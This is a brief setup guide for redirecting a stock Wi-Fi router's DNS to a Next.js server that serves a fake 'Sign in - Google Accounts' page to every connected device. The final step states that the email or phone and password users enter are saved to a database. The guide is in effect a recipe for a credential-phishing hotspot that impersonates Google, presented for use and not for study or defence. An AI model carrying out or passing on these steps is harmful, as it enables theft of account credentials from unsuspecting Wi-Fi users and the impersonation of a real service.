# Stock Router DNS Redirection Setup Guide (Zero Flashing Required)

This guide allows you to connect **ANY standard Wi-Fi router** (TP-Link, D-Link, Netgear, ISP modem, etc.) to your Next.js Google Sign-In portal in under **2 minutes** without flashing OpenWrt.

---

## Step 1: Find Your Next.js App IP Address

- If running locally on your laptop/server connected to the router:
  - **Windows**: Open Command Prompt and type `ipconfig` (Look for `IPv4 Address`, e.g. `192.168.1.100`).
  - **Mac/Linux**: Open terminal and type `ifconfig` or `ip a`.

---

## Step 2: Configure Your Stock Router DNS Settings

1. Open your web browser and go to your router's IP address (usually `http://192.168.1.1` or `http://192.168.0.1`).
2. Log in with your router's admin credentials (usually on a sticker under the router).
3. Go to **DHCP Server Settings** or **LAN / DNS Settings**.
4. Set:
   - **Primary DNS**: Enter your Next.js server IP (e.g., `192.168.1.100`).
   - **Secondary DNS**: Leave blank or set to your Next.js server IP.
5. Click **Save / Apply Settings**.

---

## Step 3: Test Connected Devices

1. Connect a phone or laptop to the router's Wi-Fi.
2. Open any website in the browser (e.g. `http://example.com` or `http://8.8.8.8`).
3. The device will resolve to your Next.js app and display the **Sign in - Google Accounts** portal!
4. Once the user types their email/phone and password, their inputs are saved to the database and they are granted access.
